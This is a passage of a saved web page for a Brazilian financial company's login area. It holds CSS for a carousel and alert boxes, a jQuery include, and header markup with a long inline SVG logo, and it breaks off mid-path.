         .ng-carousel slidecontainer {
         display: block;
         position: absolute;
         top: 0;
         width: 100%;
         height: 100%;
         z-index: 1;
         font-size: 0; }
         .ng-carousel slidecontainer.carousel-ignore-first-slide {
         -webkit-transform: translate(-100%, 0);
         transform: translate(-100%, 0); }
         .ng-carousel slidecontainer.carousel-animate {
         -webkit-transition: -webkit-transform .5s ease-out 0s;
         transition: -webkit-transform .5s ease-out 0s;
         transition: transform .5s ease-out 0s;
         transition: transform .5s ease-out 0s, -webkit-transform .5s ease-out 0s; }
         .ng-carousel slide {
         position: relative;
         display: inline-block;
         vertical-align: top;
         font-size: 16px;
         width: 100%;
         height: 100%;
         background-size: cover;
         background-position: center; }
         .ng-carousel .carousel-arrow {
         display: inline-block;
         position: absolute;
         top: 0;
         bottom: 0;
         z-index: 1;
         width: 100px;
         text-align: center; }
         .ng-carousel .carousel-arrow.carousel-arrow-left {
         left: 0; }
         .ng-carousel .carousel-arrow.carousel-arrow-right {
         right: 0; }
         .alert {
    display: flex;
    align-items: center;
    border: 1px solid #e0e0e0;
    border-radius: 3px;
    background-color: #f2f2f2;
    padding: 10px 15px;
    color: #706f6f;
    gap: 20px;
    margin-bottom: 50px;
}
.alert p {
    line-height: 15px;
    letter-spacing: 0.01em;
    font-size: 14px;
}
.alert svg {
    fill: #706f6f;
    width: 100%;
    max-width: 24px;
}
      </style>
      
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

   </head>
   <body class="">
      <div id="root">
         <div id="root-angular">
            <div id="__single_spa_angular_1" class="ng-scope">
               <div ontouchstart="" browser-detector="" is-logged="" class="ng-scope chrome chrome99 not-logged">
                  <!-- uiView: -->
                  <div ui-view="" class="ng-scope" style="">
                     <div class="auth-shell ng-scope">
                        <site-header class="ng-isolate-scope">
                           <header class="site-header">
                              <div class="row">
                                 <div class="site-header__left column small-7 medium-7 hidden-eq-small">
                                    <h1 class="site-header__left-logo">
                                       <a parametro-local-key="LINK_SITE_REALIZE" parametro-local-attr="href" target="_blank" class="ng-isolate-scope" href="https://www.realizesolucoesfinanceiras.com.br/site/">
                                          <!-- ngInclude: 'logo-realize.svg' | assetPath:'vectors'  -->
                                          <div class="site-header__logo-icon ng-scope" ng-include="'logo-realize.svg' | assetPath:'vectors' " style="">
                                             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 230" focusable="false" class="ng-scope">
                                                <g stroke-width="5">
                                                   <path fill="#fff" d="M499.519 222.077v3.842h-3.85v-3.842zm-12.272-13.684l6.496 17.526h-4.09l-1.203-3.842h-6.497l-1.444 3.842h-3.85l6.497-17.526zm.24 10.803l-2.165-6.482-2.166 6.482zm-12.751 2.881v3.842h-3.85v-3.842zm-16.843-.48c.24.48.48.72.962.96.481.24.722.48 1.203.48.481.24.963.24 1.444.24h1.203c.481 0 .722-.24 1.203-.24.24-.24.722-.48.963-.72.24-.24.24-.72.24-1.2s-.24-.96-.481-1.2c-.24-.24-.722-.48-1.203-.72-.481-.24-.963-.48-1.685-.48-.721-.24-1.203-.24-1.924-.481-.722-.24-1.204-.48-1.925-.48-.722-.24-1.203-.48-1.685-.96-.48-.48-.962-.96-1.203-1.441-.24-.48-.481-1.2-.481-1.92 0-.961.24-1.681.481-2.402.481-.72.963-1.2 1.444-1.68.722-.48 1.203-.72 2.166-.96.721-.24 1.684-.24 2.406-.24.962 0 1.684 0 2.646.24.722.24 1.685.48 2.166.96.722.48 1.203.96 1.444 1.68.48.72.48 1.681.48 2.641h-3.368c0-.48-.24-.96-.24-1.2-.241-.24-.482-.72-.722-.72-.24-.24-.722-.24-.963-.48-.48 0-.721-.24-1.203-.24h-.962c-.24 0-.481.24-.963.24l-.721.72c-.241.24-.241.48-.241.96 0 .24 0 .72.24.72.241.24.482.48.722.48.482.24.963.24 1.685.48s1.443.48 2.646.721c.241 0 .722.24 1.444.24.481.24 1.203.48 1.684.72l1.444 1.44c.481.721.722 1.441.722 2.402 0 .72-.24 1.44-.481 2.16-.24.72-.722 1.2-1.444 1.681-.722.48-1.444.96-2.166 1.2-.962.24-1.924.48-3.128.48-.962 0-1.924 0-2.887-.24-.962-.24-1.684-.72-2.406-1.2-.722-.48-1.203-1.2-1.684-1.92s-.722-1.681-.482-2.882h3.61c-.241 1.2-.241 1.681 0 2.161zm-24.304-4.802c.24-.72.722-1.44 1.203-2.16.482-.48 1.203-.96 2.166-1.44.722-.24 1.684-.481 2.647-.481.962 0 1.925.24 2.646.48.722.24 1.444.72 2.166 1.44.481.48.962 1.201 1.203 2.161.24.72.481 1.681.481 2.641s-.24 1.921-.481 2.641c-.24.72-.722 1.44-1.203 2.161-.481.48-1.203.96-2.166 1.44-.721.24-1.684.48-2.646.48-.963 0-1.925-.24-2.647-.48s-1.444-.72-2.166-1.44a4.64 4.64 0 0 1-1.203-2.16c-.24-.721-.481-1.681-.481-2.642 0-.72.24-1.68.481-2.64zm3.128 4.322c0 .48.24.96.481 1.2.241.48.482.72.963.96s.962.24 1.444.24c.48 0 .962 0 1.443-.24.482-.24.722-.48.963-.96.24-.48.481-.72.481-1.2s.24-.96.24-1.44 0-.96-.24-1.441c0-.48-.24-.96-.481-1.2-.24-.48-.481-.72-.963-.96-.48-.24-.962-.24-1.443-.24-.482 0-.963 0-1.444.24s-.722.48-.963.96c-.24.48-.48.72-.48 1.2s-.241.96-.241 1.44.24.96.24 1.44zm-4.57-7.683v2.401H429.5v6.242c0 .48 0 .96.24 1.2.241.24.482.24 1.204.24h.962v2.642h-3.368c-.482 0-.963-.24-1.203-.48-.482-.24-.722-.48-.963-.96s-.24-.961-.24-1.441v-7.443h-2.166v-2.4h2.166v-3.842h3.368v3.841zm-18.286 0v1.68c.481-.72.962-1.2 1.684-1.68.722-.24 1.444-.48 2.166-.48.962 0 1.684.24 2.406.48.481.24.962.72 1.444.96.24.48.481.96.722 1.681.24.72.24 1.44.24 2.16v7.683h-3.368v-7.202c0-.96-.241-1.92-.482-2.4-.24-.481-.962-.721-1.684-.721-.962 0-1.684.24-2.166.96-.48.48-.721 1.44-.721 2.881v6.723h-3.369v-12.725zm-13.476 9.363c.482.48 1.203.72 2.166.72.722 0 1.203-.24 1.925-.48.481-.24.722-.72.962-1.2h3.128c-.48 1.44-1.203 2.641-2.165 3.361s-2.166.96-3.61.96c-.962 0-1.924-.24-2.646-.48s-1.444-.72-1.925-1.44a4.64 4.64 0 0 1-1.203-2.16c-.24-.721-.481-1.681-.481-2.642s.24-1.92.48-2.64c.241-.72.723-1.441 1.204-2.161.481-.48 1.203-.96 1.925-1.44.722-.24 1.684-.481 2.647-.481s1.924.24 2.887.72c.722.48 1.444.96 1.925 1.68.481.721.962 1.441 1.203 2.402.24.96.24 1.92.24 2.88h-9.624c0 1.201.24 1.921.962 2.401zm3.85-6.482c-.481-.48-.962-.72-1.925-.72-.481 0-.962 0-1.443.24-.482.24-.722.48-.963.72-.24.24-.481.48-.481.96 0 .24-.24.48-.24.72h5.533c.241-.96 0-1.44-.48-1.92zm-26.468-2.88v1.68c.48-.72.962-1.2 1.684-1.44s1.444-.481 2.165-.481 1.444.24 2.166.48 1.203.96 1.444 1.68l1.443-1.44c.722-.48 1.444-.72 2.166-.72s1.203 0 1.925.24l1.444.72c.48.24.721.72.962 1.44.24.481.24 1.201.24 2.162v8.402h-3.368v-8.402c0-.48-.24-.72-.24-.96l-.722-.721c-.241-.24-.722-.24-1.204-.24-.48 0-.962 0-1.203.24l-.721.72c-.241.24-.241.72-.241.96v8.163h-3.369V217.756c0-.48 0-.72-.24-.96s-.24-.48-.722-.721c-.24-.24-.722-.24-1.203-.24h-.722c-.24 0-.481.24-.722.48-.24.24-.481.48-.722.96-.24.48-.24.96-.24 1.44v7.203h-3.369v-12.724h3.369zm-9.625-2.162v-2.88h3.37v2.88zm3.61 2.161v12.725h-3.61v-12.725zm-5.535 0v2.401h-2.647v6.242c0 .48 0 .96.24 1.2.241.24.482.24 1.204.24h.962v2.642h-3.368c-.482 0-.963-.24-1.203-.48-.482-.24-.722-.48-.963-.96-.24-.48-.24-.961-.24-1.441v-7.443h-2.166v-2.4h2.166v-3.842h3.368v3.841zm-17.084 9.363c.24.24.24.48.481.72.24.24.481.24.963.48h1.684c.24 0 .481-.24.722-.24.24-.24.481-.24.481-.48.24-.24.24-.48.24-.72 0-.48-.24-.96-.962-1.2s-1.684-.48-2.887-.72c-.481 0-.963-.24-1.444-.48s-.962-.24-1.203-.72c-.481-.24-.722-.48-.962-.961-.241-.48-.241-.96-.241-1.44 0-.72.24-1.441.481-1.921.24-.48.722-.96 1.203-1.2.482-.24 1.203-.48 1.685-.72.721-.241 1.203-.241 1.924-.241s1.444 0 1.925.24c.722.24 1.203.24 1.685.72.481.24.962.72 1.203 1.2.24.48.481 1.201.481 1.921h-2.887c0-.72-.241-1.2-.722-1.44s-.963-.24-1.685-.24h-.721c-.241 0-.482 0-.722.24-.24 0-.24.24-.481.24-.241.24-.241.48-.241.72s0 .48.24.72c.241.24.482.24.963.48s.722.24 1.203.24.963.24 1.444.24.962.24 1.444.481c.48.24.962.48 1.203.72.48.24.721.72.962.96.24.48.24.961.24 1.441 0 .72-.24 1.44-.48 2.16-.241.481-.722.961-1.204 1.441-.48.24-1.203.48-1.925.72-.721.24-1.443.24-2.165.24s-1.444 0-2.166-.24c-.721-.24-1.443-.48-1.925-.72s-.962-.72-1.443-1.44c-.24-.48-.482-1.2-.482-2.16h3.37c.48.48.48.72.721.96zm-13.233 0c.481.48 1.203.72 2.165.72.722 0 1.204-.24 1.925-.48.482-.24.722-.72.963-1.2h3.128c-.481 1.44-1.203 2.641-2.166 3.361-.962.72-2.165.96-3.609.96-.962 0-1.925-.24-2.647-.48s-1.443-.72-1.925-1.44a4.64 4.64 0 0 1-1.203-2.16c-.24-.721-.481-1.681-.481-2.642s.24-1.92.481-2.64c.24-.72.722-1.441 1.203-2.161.482-.48 1.203-.96 1.925-1.44.722-.24 1.685-.481 2.647-.481.963 0 1.925.24 2.887.72.722.48 1.444.96 1.925 1.68s.963 1.441 1.203 2.402c.241.96.241 1.92.241 2.88h-9.143c-.482 1.201 0 1.921.48 2.401zm3.85-6.482c-.482-.48-.963-.72-1.925-.72-.481 0-.963 0-1.444.24s-.722.48-.962.72c-.241.24-.482.48-.482.96 0 .24-.24.48-.24.72h5.534c.24-.96 0-1.44-.481-1.92zm-16.844 9.603l-4.331-12.724h3.61l2.646 8.643 2.647-8.643h3.368l-4.33 12.724zm-13.956-12.484v1.68c.481-.72.963-1.2 1.684-1.68.722-.24 1.444-.48 2.166-.48.962 0 1.684.24 2.406.48.481.24.963.72 1.444.96.24.48.481.96.722 1.681.24.72.24 1.44.24 2.16v7.683h-3.368v-7.202c0-.96-.24-1.92-.482-2.4-.24-.481-.962-.721-1.684-.721-.962 0-1.684.24-2.165.96-.482.48-.722 1.44-.722 2.881v6.723h-3.61v-12.725zm-6.254-5.041v17.526h-3.85v-17.526zm-20.694 14.404c.481.48 1.203.72 2.165.72.722 0 1.204-.24 1.925-.48.482-.24.722-.72.963-1.2h3.128c-.481 1.44-1.203 2.641-2.166 3.361s-2.165.96-3.609.96c-.962 0-1.925-.24-2.647-.48-.722-.24-1.443-.72-1.925-1.44a4.64 4.64 0 0 1-1.203-2.16c-.24-.721-.481-1.681-.481-2.642s.24-1.92.481-2.64c.24-.72.722-1.441 1.203-2.161.482-.48 1.203-.96 1.925-1.44.722-.24 1.685-.481 2.647-.481s1.925.24 2.887.72c.722.48 1.444.96 1.925 1.68.482.721.963 1.441 1.203 2.402.241.96.241 1.92.241 2.88h-9.143c-.482 1.201-.241 1.921.48 2.401zm3.85-6.482c-.481-.48-.963-.72-1.925-.72-.481 0-.963 0-1.444.24s-.722.48-.962.72c-.241.24-.482.48-.482.96 0 .24-.24.48-.24.72h5.534c.24-.96 0-1.44-.481-1.92zm-28.633.48c.24-.72.722-1.44 1.203-2.16.481-.48 1.203-.96 2.165-1.44.722-.24 1.685-.481 2.647-.481.963 0 1.925.24 2.647.48.722.24 1.444.72 2.165 1.44.482.48.963 1.201 1.204 2.161.24.72.48 1.681.48 2.641s-.24 1.921-.48 2.641c-.241.72-.722 1.44-1.204 2.161-.48.48-1.203.96-2.165 1.44-.722.24-1.684.48-2.647.48-.962 0-1.925-.24-2.647-.48-.721-.24-1.443-.72-2.165-1.44a4.64 4.64 0 0 1-1.203-2.16c-.24-.721-.482-1.681-.482-2.642 0-.72 0-1.68.482-2.64zm3.128 4.322c0 .48.24.96.481 1.2.24.48.481.72.962.96.482.24.963.24 1.444.24s.963 0 1.444-.24.722-.48.962-.96.481-.72.481-1.2.241-.96.241-1.44 0-.96-.24-1.441c0-.48-.241-.96-.482-1.2-.24-.48-.481-.72-.962-.96s-.963-.24-1.444-.24-.962 0-1.444.24c-.48.24-.721.48-.962.96-.24.48-.481.72-.481 1.2s-.24.96-.24 1.44 0 .96.24 1.44zm-4.813-7.683v2.401h-2.647v6.242c0 .48 0 .96.24 1.2.241.24.482.24 1.204.24h.962v2.642h-3.368c-.482 0-.963-.24-1.203-.48-.482-.24-.722-.48-.963-.96-.24-.48-.24-.961-.24-1.441v-7.443h-2.166v-2.4h2.166v-3.842h3.368v3.841zm-18.047 0v1.68c.48-.72.962-1.2 1.684-1.68.722-.24 1.444-.48 2.165-.48.963 0 1.685.24 2.407.48.48.24.962.72 1.443.96.24.48.481.96.722 1.681s.24 1.44.24 2.16v7.683h-3.368v-7.202c0-.96-.24-1.92-.481-2.4-.24-.481-.963-.721-1.684-.721-.963 0-1.685.24-2.166.96-.481.48-.722 1.44-.722 2.881v6.723h-3.368v-12.725zm-13.714 9.363c.481.48 1.203.72 2.165.72.722 0 1.203-.24 1.925-.48.482-.24.722-.72.963-1.2h3.128c-.481 1.44-1.203 2.641-2.166 3.361s-2.165.96-3.609.96c-.962 0-1.925-.24-2.647-.48s-1.443-.72-1.925-1.44a4.64 4.64 0 0 1-1.203-2.16c-.24-.721-.481-1.681-.481-2.642s.24-1.92.481-2.64c.24-.72.722-1.441 1.203-2.161.482-.48 1.203-.96 1.925-1.44.722-.24 1.685-.481 2.647-.481.963 0 1.925.24 2.887.72.722.48 1.444.96 1.925 1.68.482.721.963 1.441 1.203 2.402.241.96.241 1.92.241 2.88h-9.143c-.241 1.201 0 1.921.48 2.401zm3.85-6.482c-.481-.48-.963-.72-1.925-.72-.481 0-.963 0-1.444.24s-.722.48-.962.72c-.241.24-.482.48-.482.96 0 .24-.24.48-.24.72h6.015c-.24-.96-.481-1.44-.962-1.92zm-26.228-2.88v1.68c.481-.72.962-1.2 1.684-1.44s1.444-.481 2.166-.481 1.444.24 2.165.48c.722.24 1.204.96 1.444 1.68l1.444-1.44c.722-.48 1.444-.72 2.406-.72.722 0 1.203 0 1.925.24l1.444.72c.48.24.721.72.962 1.44.24.481.24 1.201.24 2.162v8.402h-3.368v-8.402c0-.48-.24-.72-.24-.96l-.722-.721c-.241-.24-.722-.24-1.203-.24s-.963 0-1.204.24l-.721.72c-.241.24-.241.72-.241.96v8.163h-3.369V217.756c0-.48 0-.72-.24-.96s-.24-.48-.722-.721c-.24-.24-.722-.24-1.203-.24h-.722c-.24 0-.481.24-.722.48-.24.24-.481.48-.722.96-.24.48-.24.96-.24 1.44v7.203h-3.369v-12.724h3.128zm-17.564 3.84c0-.72.24-1.44.722-1.92.24-.48.722-.96 1.443-1.2.482-.24 1.203-.48 1.925-.72.722-.241 1.444-.241 2.166-.241s1.203 0 1.925.24c.722 0 1.203.24 1.684.48.481.24.963.72 1.203 1.2.24.48.481.961.481 1.921v8.163c0 .48.241.96.241 1.2h-3.61c0-.24 0-.48-.24-.48v-.72c-.481.48-1.203.96-1.925 1.2s-1.443.24-2.406.24c-.722 0-1.203 0-1.684-.24l-1.444-.72c-.481-.24-.722-.72-.962-1.2-.241-.48-.241-.96-.241-1.68s.24-1.201.481-1.681.481-.72.963-1.2l1.443-.72c.482-.241.963-.241 1.444-.241s.963-.24 1.444-.24.962 0 1.444-.24c.48 0 .721-.24.962-.48s.24-.48.24-.72c0-.48 0-.72-.24-.96 0-.241-.24-.481-.481-.481-.24-.24-.481-.24-.722-.24h-.963c-.721 0-1.203.24-1.684.48s-.722.72-.722 1.44h-2.887zm7.94 2.401c-.24.24-.24.24-.481.24s-.481.24-.722.24c-.24 0-.481 0-.722.24-.24 0-.481 0-.722.24-.24 0-.48 0-.721.24-.241 0-.482.24-.722.24l-.482.481c0 .24-.24.48-.24.72s0 .48.24.72c0 .24.241.48.482.48.24.24.481.24.722.24h.721c.722 0 1.204 0 1.685-.24.481-.24.722-.48.722-.72.24-.24.24-.72.24-.96v-.72zm-14.197-8.402v-2.881h3.369v2.88zm3.61 2.16v12.725h-3.37v-12.725zm-11.55 2.16c-.482 0-.963.241-1.444.481s-.722.48-.963.96c-.24.48-.48.72-.48 1.2 0 .481-.241.961-.241 1.441 0 .48 0 .96.24 1.44 0 .481.24.961.481 1.201.241.48.482.72.963.96s.722.48 1.444.48 1.443-.24 1.924-.72c.482-.48.722-1.2.963-1.92h3.128c-.24 1.68-.963 2.88-1.925 3.841-.962.96-2.406 1.2-4.09 1.2-.963 0-1.925-.24-2.647-.48-.722-.24-1.444-.72-1.925-1.44-.481-.48-.963-1.2-1.203-1.92-.24-.721-.481-1.681-.481-2.642 0-.96.24-1.92.48-2.64.241-.72.723-1.681 1.204-2.161s1.203-1.2 1.925-1.44 1.684-.481 2.647-.481c.721 0 1.443 0 2.165.24s1.203.48 1.925.96l1.444 1.44c.24.481.48 1.201.48 2.162h-3.368c-.48-1.44-1.203-2.161-2.646-2.161zm-17.325-2.16v1.68c.481-.72.962-1.2 1.684-1.68.722-.24 1.444-.48 2.166-.48.962 0 1.684.24 2.406.48.481.24.963.72 1.444.96.24.48.481.96.722 1.681.24.72.24 1.44.24 2.16v7.684h-3.368v-7.203c0-.96-.241-1.92-.482-2.4-.24-.481-.962-.721-1.684-.721-.962 0-1.684.24-2.166.96-.48.48-.721 1.44-.721 2.881v6.723h-3.369v-12.725zm-17.564 3.841c0-.72.241-1.44.722-1.92.24-.48.722-.96 1.444-1.2.481-.24 1.203-.48 1.925-.72.722-.241 1.443-.241 2.165-.241s1.203 0 1.925.24c.722 0 1.203.24 1.685.48.48.24.962.72 1.203 1.2.24.48.48.961.48 1.921v8.163c0 .48.242.96.242 1.2h-3.61c0-.24 0-.48-.24-.48v-.72c-.482.48-1.203.96-1.925 1.2s-1.444.24-2.406.24c-.722 0-1.203 0-1.685-.24l-1.443-.72c-.482-.24-.722-.72-.963-1.2-.24-.48-.24-.96-.24-1.68s.24-1.201.48-1.681c.241-.48.482-.72.963-1.2l1.444-.72c.481-.241.962-.241 1.444-.241.48 0 .962-.24 1.443-.24.482 0 .963 0 1.444-.24.481 0 .722-.24.962-.48.241-.24.241-.48.241-.72 0-.48 0-.72-.24-.96-.241-.241-.241-.481-.482-.481-.24-.24-.481-.24-.722-.24h-.962c-.722 0-1.203.24-1.684.48-.482.24-.722.72-.722 1.44h-2.888zm8.181 2.401c-.24.24-.24.24-.48.24-.242 0-.482.24-.723.24-.24 0-.481 0-.722.24-.24 0-.48 0-.721.24-.241 0-.482 0-.722.24-.24 0-.482.24-.722.24l-.481.481c0 .24-.241.48-.241.72s0 .48.24.72c0 .24.241.48.482.48.24.24.481.24.722.24h.722c.721 0 1.203 0 1.684-.24.481-.24.722-.48.722-.72.24-.24.24-.72.24-.96v-.72zm-19.25-6.242v1.68c.481-.72.963-1.2 1.684-1.68.722-.24 1.444-.48 2.166-.48.962 0 1.684.24 2.406.48.481.24.963.72 1.444.96.24.48.481.96.722 1.681.24.72.24 1.44.24 2.16v7.684h-3.368v-7.203c0-.96-.24-1.92-.482-2.4-.24-.481-.962-.721-1.684-.721-.962 0-1.684.24-2.165.96-.482.48-.722 1.44-.722 2.881v6.723h-3.61v-12.725zm-9.383-2.16v-2.881h3.368v2.88zm3.368 2.16v12.725h-3.368v-12.725zm-5.293-5.041v3.12h-8.422v4.082h7.219v2.881h-7.219v7.203h-3.85v-17.527h12.272zm-21.655 13.685v3.84c0 .481 0 .961-.24 1.441-.241.48-.482.96-.723 1.2s-.722.721-1.203.961c-.481.24-.962.48-1.443.48v-1.68c.24 0 .48-.24.721-.24.241-.24.482-.24.482-.48.24-.24.24-.48.48-.72v-.721h-1.683v-3.841h3.609zm-18.288-5.283c.24-.72.722-1.44 1.203-2.16.482-.48 1.203-.96 2.166-1.44.722-.24 1.684-.481 2.647-.481.962 0 1.925.24 2.646.48.722.24 1.444.72 2.166 1.44.481.48.962 1.201 1.203 2.161.24.72.481 1.681.481 2.641s-.24 1.921-.48 2.641c-.242.72-.723 1.44-1.204 2.161-.481.48-1.203.96-2.166 1.44-.721.24-1.684.48-2.646.48-.963 0-1.925-.24-2.647-.48-.722-.24-1.444-.72-2.166-1.44a4.64 4.64 0 0 1-1.203-2.16c-.24-.721-.481-1.681-.481-2.642 0-.72 0-1.68.481-2.64zm3.128 4.322c0 .48.24.96.481 1.2.241.48.482.72.963.96s.962.24 1.444.24c.48 0 .962 0 1.443-.24.482-.24.722-.48.963-.96.24-.48.481-.72.481-1.2s.24-.96.24-1.44 0-.96-.24-1.441c0-.48-.24-.96-.481-1.2-.24-.48-.481-.72-.963-.96-.48-.24-.962-.24-1.443-.24-.482 0-.963 0-1.444.24s-.722.48-.963.96c-.24.48-.48.72-.48 1.2s-.241.96-.241 1.44 0 .96.24 1.44zm-4.811-7.683v2.401h-2.647v6.242c0 .48 0 .96.24 1.2h2.407v2.642H67.373c-.48 0-.962-.24-1.203-.48-.481-.24-.722-.48-.962-.96s-.24-.961-.24-1.441v-7.443H62.56v-2.4h2.166v-3.842h3.368v3.841h2.647zm-13.236-2.16v-2.881h3.369v2.88zm3.61 2.16v12.725h-3.37v-12.725zm-9.624 10.804c-.481.72-.962 1.2-1.684 1.441-.722.24-1.444.48-2.166.48-.962 0-1.684-.24-2.406-.48-.722-.48-1.203-.96-1.684-1.44-.481-.72-.722-1.441-.963-2.161-.24-.72-.24-1.68-.24-2.641 0-.96 0-1.68.24-2.401s.482-1.44.963-2.16c.481-.721.962-1.201 1.684-1.441.722-.48 1.444-.48 2.406-.48.722 0 1.444.24 2.166.48s1.203.72 1.684 1.44v-6.242h3.369v17.526h-3.369zm-.24-6.242c0-.48-.241-.96-.482-1.2-.24-.48-.481-.72-.962-.96s-.963-.24-1.444-.24-.962 0-1.444.24c-.48.24-.721.48-.962.96s-.481.72-.481 1.2-.241.96-.241 1.44c0 .481 0 .961.24 1.441 0 .48.241.96.482 1.2.24.48.481.721.962.961.482.24.963.24 1.444.24s.963 0 1.444-.24.722-.48.962-.96.481-.72.481-1.2.241-.961.241-1.441c0-.48 0-.96-.24-1.44zm-19.01 4.802c.481.48 1.203.72 2.166.72.722 0 1.203-.24 1.925-.48.48-.24.722-.72.962-1.2h3.128c-.481 1.44-1.203 2.64-2.165 3.36s-2.166.96-3.61.96c-.962 0-1.925-.24-2.646-.48s-1.444-.72-1.925-1.44a4.64 4.64 0 0 1-1.203-2.16c-.241-.72-.482-1.681-.482-2.642 0-.96.241-1.92.482-2.64.24-.72.721-1.441 1.203-2.161.48-.48 1.203-.96 1.925-1.44.721-.24 1.684-.48 2.646-.48.963 0 1.925.24 2.888.72.722.48 1.443.96 1.925 1.68.48.72.962 1.44 1.203 2.4.24.961.24 1.921.24 2.882H31.28c0 1.2.24 1.92.962 2.4zm3.85-6.483c-.481-.48-.962-.72-1.925-.72-.481 0-.962 0-1.444.24-.48.24-.721.48-.962.72-.24.24-.481.48-.481.96 0 .24-.24.481-.24.721h5.533c.24-.96 0-1.44-.48-1.92zm-1.203-9.603l-2.647 4.322h2.406l4.09-4.322zm-12.753 6.722v2.401c.24-.48.482-.72.722-1.2.24-.24.481-.72.963-.96.24-.24.722-.48 1.203-.48.481-.241.722-.241 1.203-.241.24 0 .481 0 .722.24v3.121H25.746c-.722 0-1.203 0-1.685.24-.481.24-.722.48-.962.96s-.481.72-.481 1.201-.241.96-.241 1.68v5.763h-3.61v-12.725zm-9.865-.24c-.24-.48-.48-.72-.962-.96-.24-.24-.722-.48-1.203-.72-.24-.24-.722-.24-1.203-.24-.963 0-1.684.24-2.166.48-.722.24-1.203.72-1.443 1.44-.482.48-.722 1.2-.963 1.92-.24.721-.24 1.441-.24 2.162s0 1.44.24 2.16c.24.72.481 1.2.722 1.921l1.444 1.44c.722.24 1.443.48 2.165.48 1.203 0 2.166-.24 2.647-.96.722-.72.962-1.68 1.203-2.88h3.61c0 1.2-.241 2.16-.723 2.88-.48.96-.962 1.681-1.684 2.161-.722.72-1.444 1.2-2.406 1.44-.962.24-1.925.48-2.887.48-1.444 0-2.647-.24-3.61-.72-.962-.48-1.925-1.2-2.646-1.92-.722-.72-1.204-1.68-1.685-2.881-.481-1.2-.481-2.4-.481-3.601 0-1.2.24-2.401.481-3.602.481-1.2.963-2.16 1.685-2.88.721-.72 1.684-1.441 2.646-1.921.963-.48 2.166-.72 3.61-.72.962 0 1.925.24 2.646.48.963.24 1.685.72 2.407 1.2.721.48 1.203 1.2 1.684 1.92.481.721.722 1.681.722 2.642h-3.128c0-.48-.24-.96-.482-1.2zM53.42 49.217v-4.802c-7.218-.24-13.715.72-19.249 2.401-5.294 1.68-10.106 4.081-13.956 7.203-3.85 2.881-7.218 6.482-9.384 10.563-2.406 3.842-4.09 8.164-5.293 12.725h-.482v-30.01H.244v121.482h4.812v-68.664c0-6.722.963-13.205 2.888-19.447 1.925-6.242 4.812-11.764 8.662-16.566 3.85-4.801 8.903-8.642 14.918-11.283C37.78 49.937 45 48.737 53.42 49.217zm90.472 54.979H46.683c.481-8.402 2.166-16.085 4.812-23.048a61.16 61.16 0 0 1 10.347-17.286C66.173 59.06 71.226 55.219 77 52.818c5.775-2.64 12.03-3.841 18.768-3.841 7.94 0 14.918 1.44 20.933 4.561 6.016 2.881 11.069 6.723 14.919 11.764 4.09 5.042 7.218 11.044 9.143 17.767 2.166 6.722 3.128 13.924 3.128 21.127zm4.572 4.802c.24-8.403-.482-16.326-2.647-24.009-1.925-7.682-5.053-14.645-9.384-20.647s-9.865-10.803-16.843-14.405c-6.737-3.6-14.918-5.522-24.302-5.522-6.738 0-13.475 1.441-19.972 4.322-6.496 2.881-12.27 6.962-17.083 12.484-4.813 5.282-8.903 12.005-11.79 19.927-2.888 7.923-4.572 16.806-4.572 26.89 0 8.882.962 17.525 3.128 25.208 2.165 7.683 5.293 14.405 9.384 20.407 4.33 5.763 9.624 10.084 16.362 13.205 6.737 3.121 14.918 4.561 24.302 4.561 13.956 0 25.505-3.84 35.13-11.524 9.384-7.922 15.159-18.966 16.843-33.131h-4.812c-2.166 13.445-7.46 23.529-15.88 30.25-8.423 6.723-19.01 9.844-31.762 9.844-8.662 0-16.122-1.44-22.137-4.561-6.015-2.881-10.828-7.203-14.678-12.245-3.85-5.281-6.737-11.283-8.421-18.246-1.685-7.202-2.647-14.646-2.888-23.048h102.022zm95.284 10.803c0 6.003-1.203 11.765-3.369 17.527-2.166 5.762-5.294 10.803-9.384 15.125-4.09 4.321-9.143 7.682-15.4 10.323s-13.233 4.082-21.174 4.082c-6.737 0-12.271-.72-16.843-2.401-4.33-1.68-8.18-3.841-10.827-6.482-2.888-2.641-4.813-5.762-6.257-8.883-1.203-3.362-1.684-6.963-1.684-10.324 0-6.482.963-11.764 3.128-15.605 2.166-4.082 4.813-7.203 8.181-9.364 3.369-2.4 7.46-3.841 11.79-4.801 4.572-.96 9.144-1.68 13.956-1.921l14.437-.72c5.053-.24 9.625-.48 13.956-1.2 4.33-.72 7.94-1.441 11.309-2.642s5.774-2.88 7.459-5.281h.48v22.567zm12.993 48.977h7.218v-4.801c-1.684.24-3.368.24-5.293.48-1.684 0-3.369-.24-5.053-.48-1.684-.48-2.888-1.2-3.85-2.401-.962-1.2-1.444-2.881-1.444-5.282V79.227c-.24-6.722-1.443-12.244-3.609-16.565s-5.053-7.923-8.662-10.564c-3.61-2.88-7.94-4.802-12.753-6.002-4.812-1.2-9.865-1.68-15.159-1.68-7.7 0-14.196.96-19.97 3.12-5.535 2.161-10.347 4.802-14.197 8.403-3.85 3.601-6.737 7.923-8.662 12.965-2.166 4.801-3.128 10.083-3.61 15.845h4.813c.722-11.284 4.812-20.167 11.79-26.169 7.219-6.242 17.084-9.363 29.836-9.363 8.181 0 14.437 1.2 19.25 3.361 4.812 2.161 8.18 4.802 10.587 7.923 2.647 3.361 4.09 6.962 4.812 10.804.722 3.841.963 7.682.963 11.283 0 4.563-.963 8.164-2.888 10.565-1.684 2.4-4.571 4.081-8.421 5.521-3.85 1.2-8.663 1.921-14.678 2.401-6.015.24-13.234.72-21.655 1.2-5.053.24-10.106.961-15.16 2.162-5.052.96-9.624 2.64-13.474 5.521-3.85 2.401-7.218 6.003-9.624 10.564s-3.61 10.564-3.61 18.247c0 10.803 3.61 18.966 11.069 24.488 7.459 5.282 17.324 7.923 29.596 7.923 6.256 0 12.27-.961 17.565-2.641 5.293-1.681 10.105-3.841 14.196-6.722 4.33-2.881 7.7-6.003 10.346-9.604 2.888-3.601 4.813-7.442 6.256-11.284h.482v15.846c0 4.561 1.203 7.682 3.85 9.363 2.646 1.92 5.774 2.64 9.143 2.64zm13.715 0h4.812V0h-4.812zm18.046-144.77h4.813V0h-4.813zm0 144.77h4.813V47.296h-4.813zm18.528-4.561l85.178-110.919v-6.002h-83.975v4.802h79.162l-85.418 110.918v6.003h94.08v-4.802zm187.92-60.021h-97.208c.481-8.403 2.165-16.086 4.812-23.048a61.15 61.15 0 0 1 10.347-17.286c4.33-4.802 9.384-8.643 15.158-11.044 5.775-2.64 12.031-3.841 18.768-3.841 7.94 0 14.919 1.44 